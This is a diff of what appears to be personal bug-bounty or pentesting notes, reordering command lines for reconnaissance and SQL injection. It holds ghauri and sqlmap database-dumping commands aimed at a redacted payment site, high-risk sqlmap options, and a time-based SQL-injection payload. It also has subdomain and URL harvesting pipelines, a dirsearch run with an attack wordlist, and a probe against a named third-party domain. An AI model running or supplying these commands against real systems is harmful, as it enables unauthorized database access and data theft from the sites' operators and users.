@@ -217,10 +217,9 @@ Amazing method: idor+sql url path+post method+originIp sql bypass+git+env disclo
 -------------------------------------------------------------------------------------
 subfidner -d <REDACTED> -all -silent | httpx-toolkit -sc -td -title -silent | grep -Ei 'asp|php|jsp|jspx|aspx'
 echo https://payment.<REDACTED> | gau
-ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --confirm
 dirsearch -u https://<REDACTED>/ -w payloads/all_attacks.txt -e php,asp,aspx,jsp,py,txt,conf,config,bak,backup,swp,old,db,sqlasp,aspx,aspx~,asp~,py,py~,rb,rb~,php,php~,bak,bkp,cache,cgi,conf,csv,html,inc,jar,js,json,jsp,jsp~,lock,log,rar,old,sql,sql.gz,sql.zip,sql.tar.gz,sql~,swp,swp~,tar,tar.bz2,tar.gz,txt,wadl,zip -i 200 --full-url
 shodan search Ssl.cert.subject.CN:"<REDACTED>" 200 --fields ip_str | httpx-toolkit -sc -title -server -td
-ghauri -r request.txt --dbs --batch --level 3 --tech=t 
+
 
 waymore -i domain[.]com -mode U -oU waymore_urls.txt
 cat waymore_urls.txt | grep "tld:" | grep -v ":80" | grep -v ":443" | sort -u | uro > juicy.txt
@@ -294,17 +293,19 @@ subfinder -dL subs |tee subss
 https://github.com/TheGetch/Burp-Suite-Pro-Scan-Profiles
 https://github.com/yubsy/Wordpress-Exploits
 
+
 echo http://speedway.net.au | gau | uro | grep -E ".php|.asp|.aspx|.jspx|.jsp" | grep "="
 sqlmap -u 'https://domain.com/blablabla.php?kID=1%27' -p parameter --dbs --delay=3
-
+ghauri -u 'https://payment.<REDACTED>/instantpay/payment/*' --dbs --batch --level 3 --confirm
+ghauri -r request.txt --dbs --batch --level 3 --tech=t 
+sqlmap -r req.txt -p query --random-agent --level=3 --risk=3 --dbms=mysql --dbs
 waybackurls --dates domain(.)com | grep '?id='
 Payload : if(now()=sysdate(),SLEEP(8),0)
 ghauri -u https://......?id=1 --dbs --hostname --current-db
 
-curl -k -s --path-as-is -X GET https://domain.com/x/document.php
 
 For Windows IIS Server: Must Try shortscan, CVE-2024-39677: NHibernate SQL Injection Vulnerability
-
+curl -k -s --path-as-is -X GET https://domain.com/x/document.php
 ----------------------------------------------------------------------------------------------------------------------
 
 Coffin Bro:
